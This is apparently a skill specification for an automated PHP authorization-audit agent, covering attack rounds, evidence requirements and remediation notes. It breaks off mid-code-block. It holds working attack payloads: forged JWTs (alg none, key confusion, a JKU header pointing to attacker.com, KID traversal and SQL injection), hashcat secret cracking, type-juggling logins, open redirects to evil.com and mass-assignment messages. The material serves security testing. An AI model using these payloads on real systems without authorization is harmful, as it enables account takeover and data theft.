> **Skill ID**: S-048-B | **Phase**: 4 | **Stage**: 2 (Attack)
> **Input**: attack_plans/{sink_id}_plan.json, Docker container access
> **Output**: exploit_results/{sink_id}_result.json, PoC脚本/{sink_id}_poc.py


## Identity

| Field | Value |
|-------|-------|
| Skill ID | S-048-B |
| Phase | Phase-4 (Attack) |
| Responsibility | Execute progressive multi-round attack against Authorization / Access Control sinks |

## Input Contract

| File | Source | Required | Fields Used |
|------|--------|----------|-------------|
| Attack plan | `$WORK_DIR/attack_plans/{sink_id}_plan.json` | ✅ | `vectors`, `filter_analysis`, `bypass_strategies` |
| Credentials | `$WORK_DIR/credentials.json` | ✅ | `cookies`, `tokens`, `api_keys` |
| Container | Docker `php` container | ✅ | `exec` access |

## 8 Attack Rounds

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R1 - Direct Privilege Escalation Access

Test admin routes by sending requests with low-privilege credentials or no credentials:

- Completely remove the `Authorization` header
- Replace the admin Token with a regular user Token
- Access `/admin/*`, `/api/admin/*`, `/dashboard/*` routes
- Try adding `X-Forwarded-For: 127.0.0.1` to bypass IP restrictions

**Success Criteria:** Low-privilege user completes admin-exclusive operations (user management, configuration changes, data export).

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R2 - Parameter Tampering & Mass Assignment

Modify identity and role parameters in requests:

- Change `user_id=1` to `user_id=2` (GET/POST parameters)
- Add `role=admin` or `is_admin=1` in registration/update requests
- Send JSON body `{"role": "admin", "is_admin": true}` during profile updates
- Test `$request->all()` endpoints by sending requests with extra fields: `balance`, `permissions`, `email_verified`

**Success Criteria:** User obtains an elevated role, accesses other users' data, or overwrites protected fields.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R3 - HTTP Method Tampering

Test access control by sending requests with different HTTP methods:

- When GET is blocked, try POST, PUT, DELETE, PATCH, OPTIONS
- `X-HTTP-Method-Override: DELETE` + POST request
- `_method=PUT` in POST body (Laravel/Symfony convention)
- HEAD request to bypass body-based authorization checks

**Success Criteria:** A blocked operation is successfully executed via an alternative HTTP method.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R4 - Weak Comparison Bypass & Type Juggling

Exploit PHP loose comparison authentication logic:

- Send magic hash: password `"0e462097431906509019562988736854"` (MD5 of `240610708`)
- Send JSON `{"password": true}` to bypass `$input == $stored`
- Send `{"password": 0}` when stored hash starts with a letter
- Send array input `password[]=` to trigger `strcmp()` returning NULL
- Craft `"1 OR 1=1"` input to test `intval()` bypass: `intval()` returns 1

**Success Criteria:** Authentication bypassed via type juggling or weak comparison.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R5 - Token Tampering (JWT)

Manipulate JWT Tokens:

1. Decode Token, change `"role": "user"` to `"role": "admin"`, re-encode
2. Set Header `"alg": "none"`, strip signature: `header.payload.`
3. If RS256: Obtain public key, sign with public key as secret using HS256
4. Modify `exp` to a far-future date, send Token to test if server validates expiration
5. Modify `sub`/`user_id` claim to another user's ID

**Success Criteria:** Modified Token is accepted by the server with elevated access privileges.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R6 - Batch ID Enumeration

Systematically enumerate object references:

- Sequential IDs: Iterate through `id=1,2,3,...,N`
- Predictable timestamps: `created_at` as part of ID composition
- UUID v1: Extract timestamp components, predict adjacent UUIDs
- Filename patterns: `report_2024_01.pdf`, `backup_20240101.sql`
- API pagination: `/api/users?page=1&per_page=1000`

**Success Criteria:** Unauthorized access to multiple other users' resources.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R7 - Multi-Step Process Skip

Bypass sequential verification steps:

- Skip email verification: Directly call post-verification endpoints
- Skip 2FA: Access protected resources without completing the second factor
- Skip payment: Jump directly from cart to order confirmation endpoint
- Skip approval: Directly call final action endpoints

**Success Criteria:** Critical business steps are bypassed, reaching final state without completing intermediate steps.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R8 - Combination Chain

Chain-exploit multiple authorization flaws:

1. Mass Assignment sets `is_admin=1` during registration
2. Use elevated role to access admin JWT issuance endpoint
3. Forge JWT with None algorithm for persistent admin access
4. Enumerate all user data via admin API + IDOR

Alternative chain: Type Juggling login bypass -> Session Fixation -> Vertical Privilege Escalation -> Data Exfiltration.

**Success Criteria:** Complete privilege escalation chain from anonymous/low-privilege to full admin with persistent access.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R9 - OAuth2/API Token Abuse

Test OAuth2 and API Token authorization boundaries by sending cross-privilege requests:

- Use a `read` scope Token to call write-operation APIs
- Modify `scope`/`aud` claims in JWTs
- Reuse Tokens across Clients (Client A's Token accessing Client B's endpoints)
- Opaque Token audit: Tamper with JWT claims and send requests to verify if the server re-validates
- Refresh Token privilege escalation: Request higher scope during refresh

**Success Criteria:** Low-privilege Token successfully executes high-privilege operations, or cross-application Token reuse succeeds.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R10 - GraphQL Deep Authorization Testing

Test GraphQL endpoint authorization completeness with the following queries:

1. Introspection query to obtain full Schema → Identify sensitive fields
2. Access private data through public field relationships
3. Mutation operations without authorization checks
4. Batch alias enumeration of user data
5. Subscription (WebSocket) endpoints lacking authentication

**Success Criteria:** Obtain unauthorized data via GraphQL relationships or Mutations.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R11 - Multi-Tenant/Subdomain Isolation Testing

1. Modify tenant_id/org_id parameters in requests
2. Use Tenant A's Session/Token to access Tenant B's subdomain
3. Analyze whether database queries enforce tenant filtering
4. Send cross-tenant requests on shared endpoints to test data leakage

**Success Criteria:** Tenant A sees Tenant B's data.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R12 - Complete Privilege Escalation Chain (Enhanced)

Advanced combination chains:
1. Information disclosure to obtain JWT Secret → Forge arbitrary user Tokens → Admin access
2. OAuth redirect_uri bypass → Steal Authorization Code → Token exchange → Account takeover
3. GraphQL introspection → Discover hidden Mutations → Mass Assignment privilege escalation → Data export
4. Multi-tenant isolation bypass → Cross-tenant admin access → Platform-wide data leakage
5. API version downgrade → Older unauthenticated endpoints → Direct access to admin functionality

**Success Criteria:** Complete chain from anonymous to cross-tenant admin.

## Evidence Requirements

| Evidence Type | Example |
|---|---|
| Privilege escalation access | Regular user request to admin endpoint returns 200 with admin data |
| Cross-user access | User A sees User B's profile/orders/message content |
| Mass Assignment | POST with `is_admin=1` grants user access to admin panel |
| JWT bypass | Modified JWT is accepted, response shows elevated privileges |
| Type Juggling | Successful login using magic hash or boolean true password |
| Process skip | Order placed successfully without completing payment step |

## Detection (Vulnerability Pattern Recognition)

The following code patterns indicate potential privilege escalation/authorization vulnerabilities:
- Pattern 1: `Model::create($request->all())` + `$guarded = []` — Mass Assignment, no field whitelist protection
- Pattern 2: `if($password == $storedHash)` — Loose comparison `==` in authentication bypassed via Type Juggling
- Pattern 3: `$order = Order::find($_GET['id'])` without `->where('user_id', Auth::id())` — IDOR, no resource ownership validation
- Pattern 4: `JWT::decode($token)` without specifying an algorithm whitelist — Vulnerable to None algorithm or RS256→HS256 confusion attack
- Pattern 5: `Route::any('/admin/{action}', ...)` without middleware protection — Admin routes missing authorization middleware
- Pattern 6: `in_array($role, ['admin', 'superadmin'])` without third parameter `true` — Loose comparison, integer 0 can match any string

## Key Insight

> **Key Point**: The core of authorization auditing is confirming through sending unauthorized requests that "each operation independently checks permissions before execution," rather than relying on frontend hiding or URL unguessability. Focus on three high-risk patterns: IDOR (resource IDs are enumerable without ownership validation), Mass Assignment (bulk assignment overwriting role/is_admin), and PHP Type Juggling (`==` loose comparison in JSON APIs can be bypassed with integers/booleans/arrays).

### Smart Pivot (Stuck Detection)

When 3 consecutive rounds fail (current round ≥ 4), trigger Smart Pivot:

1. Re-reconnaissance: Re-read target code to find overlooked filtering logic and alternative entry points
2. Cross-intelligence: Consult the shared findings store (`$WORK_DIR/audit_session.db`) for related findings from other experts
3. Decision tree matching: Select a new attack direction based on failure patterns in `shared/pivot_strategy.md`
4. If no new paths found, terminate early to avoid wasting rounds generating hallucinated results

## Prerequisites & Scoring (MUST be filled)

The output `exploits/{sink_id}.json` MUST include the following two objects:

### prerequisite_conditions
```json
{
  "auth_requirement": "anonymous|authenticated|admin|internal_network",
  "bypass_method": "Authentication bypass method, null if none",
  "other_preconditions": ["Precondition 1", "Precondition 2"],
  "exploitability_judgment": "directly_exploitable|conditionally_exploitable|not_exploitable"
}
```
- `auth_requirement` MUST match the auth_level for this route in auth_matrix.json
- `exploitability_judgment = "not_exploitable"` → final_verdict SHALL be at most potential
- `other_preconditions` lists all non-authentication prerequisites (e.g., PHP configuration, Composer dependencies, environment variables)

### severity (Three-dimensional scoring, see shared/severity_rating.md for details)
```json
{
  "reachability": 0-3, "reachability_reason": "...",
  "impact": 0-3, "impact_reason": "...",
  "complexity": 0-3, "complexity_reason": "...",
  "score": "R×0.40+I×0.35+C×0.25",
  "cvss": "(score/3.0)×10.0",
  "level": "C|H|M|L",
  "vuln_id": "C-RCE-001"
}
```
- All reason fields MUST contain specific justification and MUST NOT be empty
- score and evidence_score MUST be consistent (≥2.10→≥7, 1.20-2.09→4-6, <1.20→1-3)

### Evidence Contract Reference (EVID)

Each vulnerability conclusion MUST reference the following evidence points in the `evidence` field (refer to `shared/evidence_contract.md`):
- `EVID_AUTH_PATH_MATCH` — Path matching rules ✅Required
- `EVID_AUTH_TOKEN_JUDGMENT` — Token judgment logic ✅Required
- `EVID_AUTH_PERMISSION_CHECK` — Permission check logic ✅Required
- `EVID_AUTH_IDOR_OWNERSHIP` — IDOR ownership verification (conditionally required)
- `EVID_AUTH_BYPASS_RESPONSE` — Bypass response evidence (required when confirmed)

Missing required EVIDs → Conclusion automatically downgraded (confirmed→suspected→unverified).

### Attack Memory Write-back

After the attack cycle ends, write experience to the attack memory store (format per `shared/attack_memory.md` write protocol):

- ✅ confirmed: Record successful payload type + bypass technique + successful round
- ❌ failed (≥3 rounds): Record all excluded strategies + failure reasons
- ⚠️ partial: Record partially successful strategies + blocking reasons
- ❌ failed (<3 rounds): Do not record

Use `bash tools/audit_db.sh memory-write '<json>'` to write; SQLite WAL mode automatically ensures concurrency safety.

## Output

After completing all rounds, write final results to `$WORK_DIR/exploits/{sink_id}.json`.

> **Strictly follow the fill-in template in `shared/OUTPUT_TEMPLATE.md` to generate the output file.**
> JSON structure follows `schemas/exploit_result.schema.json`; field constraints are in `shared/data_contracts.md` Section 9.
> Execute the 3 check commands at the bottom of OUTPUT_TEMPLATE.md before submission.

## Collaboration

- Pass discovered credentials or Tokens to the Information Leakage Auditor
- Pass discovered admin endpoints to the Configuration Auditor for further probing
- All findings MUST be submitted to the QA Reviewer for evidence verification before final confirmation

## Real-time Sharing & Second-Order Tracking

### Shared Writes
When valid credentials/Tokens are discovered, you **MUST** write to the shared findings store (`$WORK_DIR/audit_session.db`):
- Forged admin Token → `finding_type: credential`
- Discovered unauthenticated admin endpoint → `finding_type: endpoint`

### Shared Reads
Read the shared findings store before starting the attack phase; leverage leaked JWT Secrets for Token forgery.

## Constraints

- DO NOT lock accounts through brute force. Use targeted low-volume enumeration
- Always send requests with designated test accounts first before broader enumeration
- Each confirmed finding MUST document the exact request/response pair

---

## PHP Type Juggling Audit

Systematic audit of PHP loose comparison in authentication and authorization scenarios.

### Detection Rules

1. **Search all `==` comparisons**, flag comparisons involving the following fields:
   - `password`, `passwd`, `pwd`, `secret`
   - `token`, `api_key`, `access_token`, `refresh_token`
   - `permission`, `role`, `is_admin`, `privilege`
2. **Search `in_array()` calls** — third parameter defaults to `false` (loose comparison):
   ```php
   // Dangerous: in_array($userRole, ['admin', 'superadmin']) — loose comparison
   // Safe: in_array($userRole, ['admin', 'superadmin'], true) — strict comparison
   ```
3. **Search `switch-case` statements** — PHP switch uses loose comparison:
   ```php
   // Dangerous: switch($role) { case 0: ... case 'admin': ... }
   // Integer 0 == 'admin' is true, will match the 'admin' case
   ```
4. **Search `strcmp()` / `strcasecmp()`** — returns `NULL` when passed an array:
   ```php
   // strcmp([], 'password') => NULL, and NULL == 0 => true
   ```
5. **Search `md5()` / `sha1()` results compared with `==`** — magic hash attack:
   ```php
   // md5('240610708') = '0e462097431906509019562988736854'
   // md5('QNKCDZO')  = '0e830400451993494058024219903391'
   // '0e...' == '0e...' => true (both interpreted as scientific notation 0)
   ```

### Attack Steps

#### Step 1: JSON Integer `0` Bypass
```http
POST /api/login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": 0}
```
Rationale: If the backend uses `$input == $storedHash`, when `$storedHash` starts with a letter, `intval("$storedHash")` is 0, so `0 == "$storedHash"` is `true`.

#### Step 2: JSON Boolean `true` Bypass
```http
POST /api/login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": true}
```
Rationale: `true == "any non-empty string"` is `true` in PHP.

#### Step 3: JSON Array `[]` Bypass
```http
POST /api/login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": []}
```
Rationale: Passing an array to `strcmp()` returns `NULL`, and `NULL == 0` is `true`; passing an array to `md5()` triggers a warning and returns `NULL`.

#### Step 4: `in_array()` Permission Check Bypass
```php
// Target code: if (in_array($userInput, $allowedValues))
// Attack: send integer 0, 0 == "any string" is true
```
```http
POST /api/check-permission HTTP/1.1
Content-Type: application/json

{"role": 0}
```

#### Step 5: `switch-case` Bypass
```php
// Target code: switch($_GET['action']) { case 'admin': doAdmin(); break; }
// Attack: ?action=0  — integer 0 loosely matches string 'admin'
```

#### Step 6: Magic Hash Collision
```http
POST /api/login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": "240610708"}
```
Only works when the backend uses `md5($input) == md5($stored)` or the stored hash happens to start with `0e` followed by all digits.

### Key Insight

> PHP's `==` operator performs implicit type conversion when comparing different types. **All authentication/authorization comparisons MUST use `===` (strict comparison)**. JSON input allows attackers to directly control variable types (integer, boolean, array), making Type Juggling especially dangerous in API scenarios. `in_array()` and `switch-case` are the most commonly overlooked loose comparison points.

---

## JWT Complete Attack Matrix

Expanded JWT attack surface, covering all known JWT implementation flaws.

### 1. Algorithm None Attack

#### Detection Rules
- Search JWT verification code, analyze whether `alg: none` is allowed
- Search JWT library version (older `firebase/php-jwt < 6.0` etc. have this vulnerability)
- Search `jwt_decode`, `JWT::decode`, `Jose\*` calls, analyze whether algorithm is strictly specified

#### Attack Steps
```bash
# Step 1: Decode original JWT
echo 'eyJhbGciOiJIUzI1NiJ9' | base64 -d
# {"alg":"HS256"}

# Step 2: Construct None algorithm Header
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_'

# Step 3: Modify Payload (escalate privileges)
echo -n '{"sub":"1","role":"admin","is_admin":true}' | base64 | tr -d '=' | tr '+/' '-_'

# Step 4: Concatenate Token (strip signature, keep trailing dot)
# header.payload.
```
```http
GET /api/admin/users HTTP/1.1
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
```

#### Key Insight
> If the server does not strictly specify the verification algorithm, an attacker can set `alg` to `none` and completely strip the signature. **The allowed algorithm list MUST be whitelisted during verification**.

### 2. RS256 to HS256 Algorithm Confusion

#### Detection Rules
- Analyze whether the server uses RS256 (asymmetric), search if public key is obtainable (`/jwks.json`, `/.well-known/jwks.json`)
- Search whether the third parameter of `JWT::decode` in code hardcodes the algorithm
- Analyze whether both RS256 and HS256 are accepted

#### Attack Steps
```bash
# Step 1: Obtain server public key
curl https://target.com/.well-known/jwks.json
# Or obtain from TLS certificate, source code leaks

# Step 2: Sign with public key as HMAC secret
# Header: {"alg": "HS256", "typ": "JWT"}
# Use public key (PEM format) as the HS256 secret for signing

python3 -c "
import jwt
public_key = open('public.pem').read()
token = jwt.encode({'sub': '1', 'role': 'admin'}, public_key, algorithm='HS256')
print(token)
"
```
```http
GET /api/admin HTTP/1.1
Authorization: Bearer <forged_token>
```

#### Key Insight
> RS256 signs with private key and verifies with public key. If the server uses the same public key as the HS256 secret for verification, an attacker holding the public key can forge Tokens. **Verification MUST strictly specify `['RS256']` and NOT accept HS256**.

### 3. JWK/JKU Header Injection

#### Detection Rules
- Search whether JWT parsing handles `jwk` or `jku` Header parameters
- Analyze whether keys are dynamically fetched from URLs in the JWT Header
- Analyze whether `jku` URLs have whitelist validation

#### Attack Steps
```bash
# Step 1: Generate attacker key pair
openssl genrsa -out attacker.pem 2048
openssl rsa -in attacker.pem -pubout -out attacker_pub.pem

# Step 2: Construct JWK containing attacker's public key
python3 -c "
from jwcrypto import jwk, jwt
key = jwk.JWK.generate(kty='RSA', size=2048)
# Place public key in Header's jwk parameter
token = jwt.JWT(header={'alg': 'RS256', 'jwk': key.export_public(as_dict=True)},
                claims={'sub': '1', 'role': 'admin'})
token.make_signed_token(key)
print(token.serialize())
"

# Step 3: JKU injection — point to attacker-controlled JWKS endpoint
# Header: {"alg": "RS256", "jku": "https://attacker.com/.well-known/jwks.json"}
# Attacker hosts the corresponding public key on their server
```

#### Key Insight
> If the server trusts `jwk` (embedded key) or `jku` (key URL) in the JWT Header, an attacker can embed their own key and sign with it. **JWT Header key parameters MUST be ignored; only server pre-configured keys SHOULD be used**.

### 4. KID Path Traversal

#### Detection Rules
- Search for usage of `kid` (Key ID) parameter in JWT processing
- Analyze whether `kid` is used for file path concatenation (e.g., `file_get_contents("/keys/" . $kid)`)
- Analyze whether `kid` is used in database queries (SQL injection possible)

#### Attack Steps
```bash
# Step 1: Empty key signing — point to /dev/null
# Header: {"alg": "HS256", "kid": "../../../dev/null"}
# /dev/null reads as empty string, sign with empty string as HMAC key

python3 -c "
import jwt
token = jwt.encode(
    {'sub': '1', 'role': 'admin'},
    '',  # empty key
    algorithm='HS256',
    headers={'kid': '../../../dev/null'}
)
print(token)
"

# Step 2: Point to known content file
# Header: {"alg": "HS256", "kid": "../../../etc/hostname"}
# Use target server's hostname file content as signing key

# Step 3: KID SQL injection
# Header: {"kid": "1' UNION SELECT 'attacker-secret' -- "}
# If kid is used in database query, inject to return attacker-controlled key value
```

#### Key Insight
> The `kid` parameter is intended to select an existing server key, but if used directly in file paths or SQL queries, an attacker can traverse to `/dev/null` (empty key) or inject a custom key value. **kid MUST have strict whitelist validation; path characters and special characters MUST be prohibited**.

### 5. Weak Key Brute Force

#### Detection Rules
- Analyze whether HS256/HS384/HS512 (symmetric algorithms) are used
- Locate key source (hardcoded, environment variable, configuration file)
- Analyze key length and complexity

#### Attack Steps
```bash
# Step 1: Brute force JWT secret using hashcat
hashcat -m 16500 -a 0 jwt_token.txt wordlist.txt

# Step 2: Dictionary attack using jwt_tool
python3 jwt_tool.py <token> -C -d common_secrets.txt

# Step 3: Test common weak keys
# "secret", "password", "123456", "changeme", "key"
# Project name, domain, "jwt_secret", "app_key"
# Laravel default: base64:... (check for .env leaks)

# Step 4: Forge Token with cracked secret
python3 -c "
import jwt
token = jwt.encode({'sub': '1', 'role': 'admin'}, 'cracked_secret', algorithm='HS256')
print(token)
"
```

#### Key Insight
> HS256 security depends entirely on key strength. Weak keys can be cracked by hashcat within minutes (GPU-accelerated). **HMAC keys MUST be at least 256-bit randomly generated; dictionary words or predictable values MUST NOT be used**.

### 6. Token Signature Not Verified

#### Detection Rules
- Search whether JWT decoding in code skips signature verification
- Analyze whether `jwt_decode` is used without passing a key parameter
- Search for `verify: false` or `options: { verify_signature: false }` configurations
- Search for `base64_decode` + `json_decode` manually parsing JWT without verifying the signature

#### Attack Steps
```bash
# Step 1: Directly modify Payload (without changing signature)
# Decode the payload portion of the original JWT
echo 'eyJzdWIiOiIyIiwicm9sZSI6InVzZXIifQ' | base64 -d
# {"sub":"2","role":"user"}

# Step 2: Construct new payload
echo -n '{"sub":"1","role":"admin","is_admin":true}' | base64 | tr -d '=' | tr '+/' '-_'

# Step 3: Replace the middle part, keep original header and signature
# original_header.NEW_PAYLOAD.original_signature
```
```http
GET /api/admin HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.original_sig_here
```

#### Key Insight
> Some implementations only decode JWTs to extract claims but never verify the signature, or skip verification under certain conditions (e.g., debug mode). **All code paths MUST enforce signature verification, and there MUST NOT be configuration switches that bypass verification**.

---

## Open Redirect Audit

Systematic audit of URL redirect vulnerabilities, with particular focus on exploitation in OAuth flows.

### Detection Rules

1. **Search `header("Location:")` calls**:
   ```php
   // Dangerous patterns:
   header("Location: " . $_GET['redirect']);
   header("Location: " . $request->input('url'));
   header("Location: " . $returnUrl);
   ```
2. **Search framework redirect methods**:
   - Laravel: `redirect()`, `Redirect::to()`, `redirect()->to()`, `back()`
   - Symfony: `RedirectResponse`, `$this->redirect()`
   - CodeIgniter: `redirect()`
   - Native: `header("Location:")`, `http_response_code(302)`
3. **Search URL parameter names**:
   - `redirect`, `redirect_uri`, `return`, `returnUrl`, `return_to`
   - `next`, `url`, `target`, `dest`, `destination`, `continue`, `goto`
   - `callback`, `cb`, `redir`, `redirect_url`, `forward`
4. **Analyze URL validation logic**:
   - Whether it only checks `startsWith('/')` but doesn't filter `//`
   - Whether it only checks `parse_url()` host but doesn't handle edge cases
   - Whether there is a domain whitelist and whether the whitelist uses strict matching

### Attack Steps

#### Step 1: Protocol-relative URL Bypass
```http
GET /login?redirect=//evil.com HTTP/1.1
```
Rationale: `//evil.com` is interpreted by the browser as `https://evil.com`, but may pass `startsWith('/')` validation.

#### Step 2: @ Symbol Bypass
```http
GET /login?redirect=https://trusted.com@evil.com HTTP/1.1
```
Rationale: In URL specification, content before `@` is userinfo; the actual request goes to `evil.com`.

#### Step 3: CRLF Injection Bypass
```http
GET /login?redirect=%0d%0aLocation:%20https://evil.com HTTP/1.1
```
Rationale: `%0d%0a` is `\r\n`, which can inject a new HTTP Header.

#### Step 4: Encoding Bypass Variants
```
/login?redirect=%2f%2fevil.com          # Double slash URL encoded
/login?redirect=\/\/evil.com            # Backslash variant
/login?redirect=https:evil.com          # Missing double slash
/login?redirect=http://trusted.com.evil.com  # Subdomain spoofing
/login?redirect=https://trusted.com%252f@evil.com  # Double encoding
```

#### Step 5: OAuth redirect_uri Exploitation
```http
# Normal: /oauth/authorize?redirect_uri=https://app.com/callback
# Attack 1: redirect_uri=https://app.com.evil.com/callback
# Attack 2: redirect_uri=https://app.com/callback/../../../attacker
# Attack 3: redirect_uri=https://app.com/callback?next=https://evil.com
# Attack 4: redirect_uri=https://app.com/callback#@evil.com
```
Steal Authorization Code or Token to achieve account takeover.

#### Step 6: JavaScript Protocol Redirect
```http
GET /redirect?url=javascript:alert(document.cookie) HTTP/1.1
GET /redirect?url=data:text/html,<script>alert(1)</script> HTTP/1.1
```

### Key Insight

> Open Redirect by itself is typically rated as low severity, but combined with OAuth flows it can escalate to **account takeover**. Lax `redirect_uri` validation allows attackers to redirect Authorization Codes/Tokens to their own server. **Strict URL whitelisting (exact match, not prefix match) MUST be used, and OAuth redirect_uri MUST exactly match the registered value**.

---

## HTTP Method Bypass Audit

Test whether method restrictions can be bypassed by sending alternative HTTP method requests to gain access to 403 endpoints.

### Detection Rules

1. **Collect all endpoints returning 403/405**:
   ```bash
   # Extract from route tables or fuzz results
   grep -r "403\|Forbidden\|deny\|unauthorized" routes/ middleware/
   ```
2. **Analyze whether route definitions restrict HTTP Methods**:
   - Laravel: `Route::get()` vs `Route::any()` vs `Route::match(['GET','POST'])`
   - Symfony: `@Route(methods={"GET"})` or YAML route configuration
   - Native PHP: `$_SERVER['REQUEST_METHOD']` checks
3. **Analyze method detection in middleware/filters**:
   ```php
   // Dangerous: CSRF only checked on POST
   if ($_SERVER['REQUEST_METHOD'] === 'POST') { checkCSRF(); }
   // PUT/PATCH/DELETE may bypass CSRF check
   ```
4. **Audit web server configuration**:
   - Apache: `<LimitExcept>` configuration
   - Nginx: `limit_except` directive
   - `.htaccess` method restriction rules

### Attack Steps

#### Step 1: Send alternative HTTP method requests to all 403 endpoints
```bash
# Batch testing
for method in GET POST PUT PATCH DELETE OPTIONS TRACE HEAD; do
    curl -X $method -o /dev/null -s -w "%{http_code} $method\n" \
        https://target.com/admin/users
done
```

#### Step 2: Method Override Headers
```http
POST /admin/users HTTP/1.1
X-HTTP-Method-Override: DELETE
X-HTTP-Method: PUT
X-Method-Override: PATCH
```

#### Step 3: POST Body Method Override (Framework Convention)
```http
POST /admin/users HTTP/1.1
Content-Type: application/x-www-form-urlencoded

_method=DELETE
```
Laravel/Symfony/Rails and other frameworks support overriding HTTP method via the `_method` parameter.

#### Step 4: OPTIONS Method Probing
```http
OPTIONS /admin/users HTTP/1.1
```
Analyze the `Allow` response header to confirm which methods the server actually accepts.

#### Step 5: Send TRACE Method Request
```http
TRACE /admin/users HTTP/1.1
```
TRACE may leak request header information (including Cookie and Authorization) and SHOULD be disabled.

#### Step 6: Content-Type Variant Bypass
```http
# Original request blocked by WAF:
POST /admin/users HTTP/1.1
Content-Type: application/json
{"action": "delete"}

# Bypass attempts:
POST /admin/users HTTP/1.1
Content-Type: application/x-www-form-urlencoded
action=delete

POST /admin/users HTTP/1.1
Content-Type: text/xml
<action>delete</action>
```

### Key Insight

> Many applications and WAFs only enforce access control on specific HTTP methods. **Route definitions MUST explicitly restrict allowed methods; middleware checks SHOULD NOT rely on a single `REQUEST_METHOD` value**. Framework `_method` override and `X-HTTP-Method-Override` Header can completely bypass method-based access control. Web server layer and application layer method restrictions MUST be configured simultaneously.

---

## WebSocket Mass Assignment Audit

Audit whether WebSocket message handling has field injection and bulk assignment vulnerabilities.

### Detection Rules

1. **Search WebSocket message handling code**:
   ```php
   // Laravel Broadcasting / Pusher
   // Search: onMessage, handleMessage, broadcastOn
   // Ratchet: MessageComponentInterface::onMessage()
   // Swoole: $server->on('message', ...)
   ```
2. **Analyze whether message parsing filters fields**:
   ```php
   // Dangerous: directly uses all fields
   $data = json_decode($msg->getPayload(), true);
   User::where('id', $data['id'])->update($data);

   // Safe: whitelist fields
   $allowed = array_intersect_key($data, array_flip(['name', 'email']));
   ```
3. **Analyze WebSocket authentication logic**:
   - Whether Token is verified when connection is established
   - Whether permissions are re-verified for each message
   - Whether channel/room subscription permissions are checked
4. **Search event/channel name injection points**:
   ```php
   // Dangerous: user controls channel name
   $channel = $data['channel']; // 'private-admin-channel'
   $this->subscribe($user, $channel);
   ```

### Attack Steps

#### Step 1: Add `isAdmin` Field
```javascript
// Normal message
ws.send(JSON.stringify({
    "action": "update_profile",
    "name": "Normal User"
}));

// Attack: inject privilege fields
ws.send(JSON.stringify({
    "action": "update_profile",
    "name": "Attacker",
    "isAdmin": true,
    "role": "admin",
    "permissions": ["*"]
}));
```

#### Step 2: Add `role` and Hidden Fields
```javascript
ws.send(JSON.stringify({
    "action": "update_settings",
    "theme": "dark",
    "role": "superadmin",
    "is_verified": true,
    "email_verified_at": "2024-01-01T00:00:00Z",
    "balance": 999999,
    "plan": "enterprise"
}));
```

#### Step 3: Channel Subscription Injection
```javascript
// Attempt to subscribe to admin channel
ws.send(JSON.stringify({
    "action": "subscribe",
    "channel": "private-admin-notifications"
}));

// Attempt to subscribe to another user's channel
ws.send(JSON.stringify({
    "action": "subscribe",
    "channel": "private-user-12345"
}));
```

#### Step 4: Event Forgery
```javascript
// Send message as another user
ws.send(JSON.stringify({
    "action": "send_message",
    "from_user_id": 1,  // forged sender
    "to_user_id": 2,
